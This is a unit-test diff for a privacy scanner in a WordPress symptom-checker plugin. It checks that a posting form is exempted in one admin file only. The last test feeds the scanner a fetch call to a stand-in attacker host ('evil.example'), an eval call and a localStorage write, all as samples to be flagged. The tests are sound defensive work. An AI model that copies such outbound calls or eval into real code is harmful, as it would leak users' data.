@@ -147,3 +147,37 @@ class ScannerReportTests(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+scan_repository = scan.scan_repository
+scan_text = scan.scan_text
+POSTING_FORMS_ALLOWED = scan.POSTING_FORMS_ALLOWED
+
+
+class PostingFormScopeTests(unittest.TestCase):
+    """Phase 5-b added one wp-admin screen with self-posting forms.
+
+    The privacy promise ("answers never leave the browser") must not be weakened
+    by that: a posting form is allowed in exactly one file, and every other
+    privacy rule still applies there.
+    """
+
+    def test_the_admin_screen_is_scanned(self) -> None:
+        report = scan_repository()
+        self.assertIn("plugins/hamyar-symptom-checker/includes/admin.php", report.scanned)
+
+    def test_one_self_posting_form_in_the_admin_screen_is_not_a_finding(self) -> None:
+        findings = scan_text("plugins/hamyar-symptom-checker/includes/admin.php", '<form method="post">')
+        self.assertEqual([], [item.as_dict() for item in findings if item.rule == "forms"])
+
+    def test_the_same_form_in_a_visitor_facing_file_is_a_finding(self) -> None:
+        findings = scan_text("plugins/hamyar-symptom-checker/templates/checker-page.php", '<form method="post">')
+        self.assertTrue(any(item.rule == "forms" for item in findings))
+
+    def test_the_exemption_covers_only_one_file(self) -> None:
+        self.assertEqual(("includes/admin.php",), POSTING_FORMS_ALLOWED)
+
+    def test_the_admin_screen_still_may_not_store_or_call_out(self) -> None:
+        for snippet in ("localStorage.setItem('a', 'b')", "fetch('https://evil.example/x')", "eval('x')"):
+            findings = scan_text("plugins/hamyar-symptom-checker/includes/admin.php", snippet)
+            self.assertTrue(findings, snippet)
